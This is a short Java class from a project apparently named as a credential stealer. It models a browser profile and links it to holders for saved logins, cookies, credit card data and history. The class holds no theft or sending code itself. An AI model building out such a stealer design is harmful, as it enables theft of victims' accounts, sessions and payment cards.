package com.github.shurpe.stealer.utils.browser;

import com.github.shurpe.stealer.utils.browser.data.BrowserDataCCs;
import com.github.shurpe.stealer.utils.browser.data.BrowserDataCookies;
import com.github.shurpe.stealer.utils.browser.data.BrowserDataHistory;
import com.github.shurpe.stealer.utils.browser.data.BrowserDataLogins;

import java.io.File;

public final class BrowserProfile {

	private final Browser browser;
	private final File directory;

	private final BrowserDataLogins dataLogins;
	private final BrowserDataCookies dataCookies;
	private final BrowserDataCCs dataCCs;
	private final BrowserDataHistory dataHistory;

	public BrowserProfile(final Browser browser, final File directory) {
		this.browser = browser;
		this.directory = directory;

		dataLogins = new BrowserDataLogins(this);
		dataCookies = new BrowserDataCookies(this);
		dataCCs = new BrowserDataCCs(this);
		dataHistory = new BrowserDataHistory(this);
	}

	public Browser getBrowser() {
		return browser;
	}

	public File getDirectory() {
		return directory;
	}

	public BrowserDataLogins getDataLogins() {
		return dataLogins;
	}

	public BrowserDataCookies getDataCookies() {
		return dataCookies;
	}

	public BrowserDataCCs getDataCCs() {
		return dataCCs;
	}

	public BrowserDataHistory getDataHistory() {
		return dataHistory;
	}
}